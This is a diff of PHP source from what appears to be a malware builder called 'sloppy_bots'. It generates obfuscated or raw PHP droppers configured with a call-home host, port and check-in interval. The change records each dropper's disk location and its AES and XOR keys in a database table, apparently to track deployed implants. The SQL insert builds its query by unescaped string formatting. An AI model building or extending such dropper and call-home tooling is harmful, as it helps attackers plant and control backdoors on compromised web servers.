@@ -338,13 +338,14 @@ function createDropper($callHome, $callhomePort, $duration, $obfsucate, $depth)
                         $encrypt = false;
                     }
                     print("Generated dropper will be: {$ob}\n");
-                    $t->begin_junk($file_in, $depth, $ob, "ob", $encrypt, $callHome, $callhomePort, 1000, $slop);
+                    $rtValues = $t->begin_junk($file_in, $depth, $ob, "ob", $encrypt, $callHome, $callhomePort, $duration, $slop);
+                    pg_exec(pg_connect(DBCONN), sprintf("INSERT INTO sloppy_bots_droppers(location_on_disk, depth, obfuscated, check_in, aeskeys, xorkey) VALUES ('%s', '%s', '%s', '%s', '%s', '%s')", $rtValues['Output File'], $depth,$obfsucate, $duration, $rtValues['Key'].".".$rtValues['IV'].".".$rtValues['tag'], $rtValues['XOR Key']));
                     system("ls -lah includes/droppers/dynamic/obfuscated");
                     break;
                 case "n":
                     $n = "includes/droppers/dynamic/raw/" . bin2hex(random_bytes(rand(5, 25))) . ".php";
                     print("Generated Dropper will be: {$n}\n");
-                    $t->begin_junk($file_in, "0", $n, "n", false, $callHome, $callhomePort, 1000, $slop);
+                    $rtValues = $t->begin_junk($file_in, "0", $n, "n", false, $callHome, $callhomePort, 1000, $slop);
                     system("ls -lah includes/droppers/dynamic/raw");
                     break;
             }
